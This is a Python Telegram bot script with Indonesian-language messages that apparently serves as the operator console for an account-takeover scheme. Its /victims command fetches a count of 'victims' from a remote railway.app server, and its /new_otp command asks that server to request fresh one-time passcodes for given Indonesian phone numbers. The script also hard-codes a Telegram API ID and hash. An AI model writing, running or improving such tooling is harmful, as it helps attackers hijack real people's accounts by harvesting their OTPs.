from telethon import TelegramClient, events
import os
import asyncio
import requests
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

API_ID = 24289127
API_HASH = 'cd63113435f4997590ee4a308fbf1e2c'
BOT_TOKEN = os.environ.get('BOT_TOKEN')
RAILWAY_URL = 'https://siluman-cancut-production.up.railway.app'

bot = TelegramClient('bot', API_ID, API_HASH)

@bot.on(events.NewMessage)
async def handle_all_messages(event):
    try:
        text = event.message.text
        
        if text.startswith('/start'):
            await event.reply('🤖 JINX BOT AKTIF! 😈\n\nGunakan URL manual:\n- /victims\n- /new_otp +62xxx')
            
        elif text.startswith('/victims'):
            response = requests.get(f'{RAILWAY_URL}/victims')
            if response.status_code == 200:
                victims = response.json().get('victims', [])
                await event.reply(f'🎯 VICTIMS: {len(victims)} korban')
            else:
                await event.reply('❌ Gagal ambil data victims')
                
        elif text.startswith('/new_otp'):
            phone = text.split(' ')[1] if ' ' in text else None
            if phone:
                response = requests.get(f'{RAILWAY_URL}/get_new_otp?phone={phone}')
                if response.status_code == 200:
                    await event.reply(f'✅ OTP baru diminta untuk {phone}')
                else:
                    await event.reply('❌ Gagal request OTP')
            else:
                await event.reply('❌ Format: /new_otp +62xxx')
                
    except Exception as e:
        await event.reply(f'💀 Error: {str(e)}')

async def main():
    await bot.start(bot_token=BOT_TOKEN)
    logger.info("🤖 SIMPLE BOT STARTED!")
    await bot.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
